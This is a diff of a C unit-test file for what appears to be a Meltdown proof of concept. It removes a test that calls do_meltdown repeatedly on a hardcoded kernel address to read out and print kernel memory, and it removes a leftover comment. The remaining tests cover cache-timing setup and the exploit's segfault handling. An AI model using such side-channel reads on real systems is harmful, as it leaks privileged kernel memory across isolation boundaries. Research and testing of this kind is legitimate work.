@@ -12,7 +12,6 @@ void test_cc_setup(){
         cc_setup();
         my_mfence();
         cur_adrs=&cc_buffer[cc_buf_offset+i*offset];
-        // printf("pointer %p\n",  &cc_buffer[cc_buf_offset+i*512+i]);
         start = my_rdtsc();
         maccess(cur_adrs);
         end = my_rdtsc();
@@ -148,7 +147,6 @@ void test_meltdown(){
         exit(EXIT_FAILURE);
     }
     
-    // does this work?
     // test segfault
     CU_ASSERT_EQUAL(do_meltdown((uintptr_t) file_ptr), -1);
     CU_ASSERT_EQUAL(do_meltdown((uintptr_t) file_ptr), -1);
@@ -156,27 +154,6 @@ void test_meltdown(){
 
 }
 
-#define REPS 1000
-#define RANGE 300
-void test_init_uts_ns(){
-    uintptr_t target = 0xffffffffb9df9920;
-    int buf[RANGE];
-    for (int i=0;i<RANGE;i++){
-        buf[i]=-1;
-    }    
-    
-    for (int i=0;i<REPS;i++){
-        for (int j=0;j<RANGE;j++){
-            if (buf[j]==-1){
-                buf[j]=do_meltdown(target+2*j);
-            }
-        }
-    }
-    
-    for (int i=0;i<RANGE;i++){
-        printf("measured value %i at position %i\n", buf[i], i);
-    }    
-}
 
 int main() {
     wait(1E9);
@@ -188,8 +165,6 @@ int main() {
    	CU_add_test(suite, "test_cc_setup", test_cc_setup);
    	CU_add_test(suite, "test_cc_transmission", test_cc_transmission);
    	CU_add_test(suite, "test_meltdown", test_meltdown);
-   	CU_add_test(suite, "test_init_uts_ns", test_init_uts_ns);
-
 
 	CU_basic_run_tests();
     CU_cleanup_registry();
